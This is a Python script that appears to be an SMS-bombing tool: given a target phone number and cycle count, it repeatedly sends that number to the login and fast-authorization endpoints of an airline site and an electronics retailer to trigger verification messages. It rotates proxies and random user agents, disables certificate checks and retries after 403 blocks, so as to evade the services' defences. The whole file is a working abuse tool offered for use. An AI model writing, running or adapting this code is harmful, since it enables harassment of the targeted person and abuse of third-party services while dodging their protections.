import requests
import time
import argparse
import random
from concurrent.futures import ThreadPoolExecutor
from fake_useragent import UserAgent
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
ua = UserAgent()

WORKING_APIS = {
    "Utair": {
        "url": "https://b.utair.ru/api/v1/login/",
        "method": "POST",
        "data": {"login": "{phone}"},
        "headers": {"Origin": "https://www.utair.ru", "Referer": "https://www.utair.ru/"}
    }
}

def load_working_proxies(filename="working_proxies.txt"):
    try:
        with open(filename, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        return []

def get_random_proxy(proxy_pool):
    if proxy_pool:
        p = random.choice(proxy_pool)
        return {"http": f"http://{p}", "https": f"http://{p}"}, p
    return None, "Direct"

def send_utair(phone, proxy_pool):
    api = WORKING_APIS["Utair"]
    data = {"login": phone}
    
    attempts = 0
    while attempts < 3:
        attempts += 1
        proxy, proxy_str = get_random_proxy(proxy_pool) if attempts <= 2 else (None, "Direct")
        
        headers = {
            "User-Agent": ua.random,
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/x-www-form-urlencoded",
            **api["headers"]
        }
        
        try:
            r = requests.post(api["url"], data=data, headers=headers, proxies=proxy, timeout=8, verify=False)
            if r.status_code in [200, 201, 204]:
                print(f"[+] OK: Utair ({r.status_code}) | Proxy: {proxy_str}")
                return
            elif r.status_code == 403:
                print(f"[-] BLOCKED 403: Utair | Proxy: {proxy_str}. Retrying...")
            else:
                print(f"[-] FAIL: Utair ({r.status_code}) | Proxy: {proxy_str}")
        except Exception as e:
            print(f"[!] ERR: Utair - {type(e).__name__} | Proxy: {proxy_str}")

def send_dns(phone, proxy_pool):
    attempts = 0
    while attempts < 3:
        attempts += 1
        proxy, proxy_str = get_random_proxy(proxy_pool) if attempts <= 1 else (None, "Direct")
        
        session = requests.Session()
        if proxy:
            session.proxies.update(proxy)
            
        session.headers.update({
            "User-Agent": ua.random,
            "Accept": "application/json, text/plain, */*",
        })
        
        try:
            session.get("https://www.dns-shop.ru/", timeout=8, verify=False)
            
            url = "https://www.dns-shop.ru/auth/auth/fast-authorization/"
            data = {"FastAuthorizationLoginLoadForm[login]": phone}
            
            session.headers.update({
                "Origin": "https://www.dns-shop.ru",
                "Referer": "https://www.dns-shop.ru/",
                "X-Requested-With": "XMLHttpRequest"
            })
            
            r = session.post(url, data=data, timeout=8, verify=False)
            
            if r.status_code in [200, 201, 204]:
                print(f"[+] OK: DNS ({r.status_code}) | Proxy: {proxy_str}")
                return
            else:
                print(f"[-] FAIL: DNS ({r.status_code}) | Proxy: {proxy_str}")
                
        except Exception as e:
            print(f"[!] ERR: DNS - {type(e).__name__} | Proxy: {proxy_str}")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-p", "--phone", required=True)
    parser.add_argument("-c", "--count", type=int, default=1)
    args = parser.parse_args()

    phone = args.phone.lstrip("+")
    proxy_pool = load_working_proxies()

    print(f"\n[*] Target: {phone}")
    print(f"[*] Cycles: {args.count}")
    print(f"[*] Proxies: {len(proxy_pool)}\n")

    try:
        for i in range(args.count):
            print(f"--- Cycle {i+1} ---")
            with ThreadPoolExecutor(max_workers=2) as executor:
                executor.submit(send_utair, phone, proxy_pool)
                executor.submit(send_dns, phone, proxy_pool)
            
            if i < args.count - 1:
                time.sleep(5)
    except KeyboardInterrupt:
        print("\n[*] Stopped.")

if __name__ == "__main__":
    main()
